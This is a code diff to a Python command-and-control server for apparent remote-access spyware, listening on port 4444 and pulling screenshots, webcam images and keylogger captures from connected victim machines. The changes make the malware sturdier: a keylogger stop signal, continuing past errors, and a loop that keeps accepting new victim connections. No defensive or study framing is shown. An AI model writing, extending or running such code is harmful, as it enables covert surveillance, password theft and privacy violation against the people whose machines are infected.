@@ -10,7 +10,8 @@ def handle_client(client_socket):
 
             if command.lower() == "exit":
                 client_socket.send(command.encode())
-                break
+                break  # Exit the loop and close the connection
+
             elif command == "screenshot":
                 client_socket.send(command.encode())
                 with open("screenshot.png", "wb") as f:
@@ -18,6 +19,8 @@ def handle_client(client_socket):
                     while data:
                         f.write(data)
                         data = client_socket.recv(4096)
+                print("[*] Screenshot saved as screenshot.png")
+
             elif command == "webcam":
                 client_socket.send(command.encode())
                 with open("webcam.jpg", "wb") as f:
@@ -25,16 +28,25 @@ def handle_client(client_socket):
                     while data:
                         f.write(data)
                         data = client_socket.recv(4096)
+                print("[*] Webcam image saved as webcam.jpg")
+
             elif command == "keylogger":
                 client_socket.send(command.encode())
-                print("[*] Waiting for keystrokes...")
+                print("[*] Waiting for keystrokes... (Ctrl+C to stop)")
                 with open("keylogs.txt", "w") as f:
-                    while True:
-                        data = client_socket.recv(1024).decode()
-                        if not data:
-                            break
-                        f.write(data)
-                        print(data)  # Print keystrokes on the server terminal
+                    try:
+                        while True:
+                            data = client_socket.recv(1024).decode()
+                            if not data or data == "STOP_KEYLOG":
+                                break
+                            f.write(data)
+                            print(data)  # Print keystrokes on the server terminal
+                    except KeyboardInterrupt:
+                        client_socket.send("STOP_KEYLOG".encode())
+                        print("[*] Keylogger stopped")
+                    except Exception as e:
+                        print(f"Keylogger error: {e}")
+
             else:
                 client_socket.send(command.encode())
                 response = client_socket.recv(4096).decode()
@@ -42,7 +54,9 @@ def handle_client(client_socket):
 
         except Exception as e:
             print(f"Error handling command: {e}")
-            break
+            continue  # Keep the loop running despite errors
+
+    client_socket.close()  # Close the socket when exiting
 
 # Function to start the server and listen for incoming connections
 def start_server(host="0.0.0.0", port=4444):
@@ -51,12 +65,13 @@ def start_server(host="0.0.0.0", port=4444):
     server.listen(5)
     print(f"[*] Listening on {host}:{port}...")
 
-    client_socket, addr = server.accept()
-    print(f"[+] Connection from {addr}")
-    handle_client(client_socket)
+    while True:  # Keep accepting new connections
+        client_socket, addr = server.accept()
+        print(f"[+] Connection from {addr}")
+        handle_client(client_socket)
+        print("[*] Client disconnected, waiting for new connection...")
 
-    client_socket.close()
-    server.close()
+    server.close()  # This line won't be reached in this setup
 
 if __name__ == "__main__":
     start_server()
